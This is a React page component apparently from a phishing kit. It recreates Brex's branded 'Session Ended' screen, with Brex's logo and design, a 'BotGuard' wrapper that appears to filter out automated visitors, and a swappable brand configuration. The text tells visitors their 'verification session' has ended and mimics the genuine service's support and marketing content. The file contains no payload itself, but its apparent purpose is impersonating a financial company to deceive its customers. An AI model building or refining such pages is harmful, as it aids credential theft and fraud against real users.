'use client';

/**
 * Brex Terminated/Session Ended Page
 * Split-screen layout matching Brex design
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { AlertTriangle } from 'lucide-react';

export default function TerminatedPage() {
  return (
    <BotGuard>
      <div className="brex-boundary">
        <div className="brex-app">

          {/* Left Column */}
          <main className="brex-layout">

            <div className="auth-org-logo">
              <img src="/logo_full_4x.png" alt="Brex Logo" />
            </div>

            <div className="auth-container">
              <h1>Session Ended</h1>

              <div className="status-container">
                {/* Warning Icon */}
                <div className="status-icon-wrapper warning">
                  <AlertTriangle strokeWidth={1.5} />
                </div>

                <p className="status-message-primary">
                  Your verification session has ended.
                </p>

                <p className="status-message-secondary">
                  This may be due to inactivity or the session was completed.
                </p>

                <p className="status-message-secondary" style={{ marginTop: '24px' }}>
                  If you believe this was an error, please contact our support team for assistance.
                </p>

                <p className="status-footer">
                  Need help? Contact {currentBrand.companyName} support
                </p>
              </div>
            </div>

            <div className="signup-link">
              New to Brex? <a href="#">Sign up</a>
            </div>

          </main>

          {/* Right Column: Marketing */}
          <aside className="marketing-content">
            <div className="marketing-inner">
              <h2 className="marketing-badge">DOWNLOAD THE MOBILE APP</h2>
              <p className="marketing-title">Access your Brex card anywhere.</p>
              <div className="marketing-img">
                <img src="/customerstories.png" alt="Brex customer stories layout" />
              </div>
            </div>
          </aside>

        </div>
      </div>
    </BotGuard>
  );
}
